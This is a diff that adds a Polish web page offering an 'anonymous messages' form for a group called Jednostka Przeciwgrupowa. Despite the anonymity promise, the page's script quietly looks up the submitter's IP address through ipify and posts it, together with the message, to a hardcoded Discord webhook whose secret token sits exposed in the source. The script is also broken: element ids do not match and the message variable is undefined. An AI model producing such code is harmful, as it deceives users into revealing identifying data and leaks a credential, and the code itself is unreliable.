@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <title>Anonimowe wiadomosci - Jednostka Przeciwgrupowa</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background-color: #fff;
+      color: #333;
+      height: 100%;
+    }
+    header {
+      background-color: #ff0000;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    nav {
+      background-color: #ff0000;
+      overflow: hidden;
+    }
+    nav a {
+      float: left;
+      display: block;
+      color: white;
+      text-align: center;
+      padding: 14px 16px;
+      text-decoration: none;
+    }
+    nav a:hover {
+      background-color: #cc0000;
+    }
+    main {
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      min-height: 60vh;
+    }
+    form {
+      max-width: 600px;
+      margin: auto;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 20px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #ff0000;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #cc0000;
+    }
+    .legal {
+      font-size: 13px;
+      margin-top: 10px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>📋 Anonimowe wiadomosci  Jednostki Przeciwgrupowej</h1>
+      </header>
+
+  <nav>
+    <a href="strona-glowna.html">Strona główna</a>
+    <a href="kontakt.html">Kontakt</a>
+    <a href="o-nas.html">O nas</a>
+    <a href="terms.html">Zasady i warunki</a>
+    <a href="rekrutacja.html">Rekrutacja</a>
+     <a href="anonimowe.html">Anonimowe wiadomosci</a>
+    
+  </nav>
+
+  <main>
+    <form id="Anonimowe wiadomsoci">
+   
+
+      <label>Wyślij nam anonimową wiadomosć</label>
+      <textarea id="description" rows="3"></textarea>
+
+      <div class="legal">
+        <input type="checkbox" id="zgoda" required>
+        <label for="zgoda">Wyrażam zgodę na przetwarzanie danych zgodnie z <a href="terms.html">regulaminem</a>.</label>
+      </div>
+
+      <button type="submit">Wyślij wiadomosc</button>
+    </form>
+  </main>
+
+  <footer>
+    <img src="a.jpg" alt="Stopka">
+    <div class="copyright">
+      &copy; 2025 Jednostka Przeciwgrupowa. Strona utworzona przez użytkownika takuba5 na zlecenie jednostki
+    </div>
+  </footer>
+
+  <script>
+    document.getElementById("anonimowewiadomosci").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+   
+     
+      const reason = document.getElementById("reason").value;
+
+
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const content = `📥 Nowa wiadomość: ${description}\n🌐 IP: ${ip}`;
+
+          fetch("https://discord.com/api/webhooks/1366442960643690617/bDTJ3sm0bAB9-1wl77j-HRfNA5ZrueSFvyDzHYhxgulFvno_5v4wC4DHOYHKsE0vxXTS", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content })
+          }).then(() => {
+            alert("Wiadomość wysłana. Dzięki 😎");
+            document.getElementById("anonimowawiadomsoc").reset();
+          }).catch(err => {
+            alert("Nie udało się wysłać wiadomości.");
+            console.error(err);
+          });
+        });
+    });
+  </script>
+
+</body>
+</html>
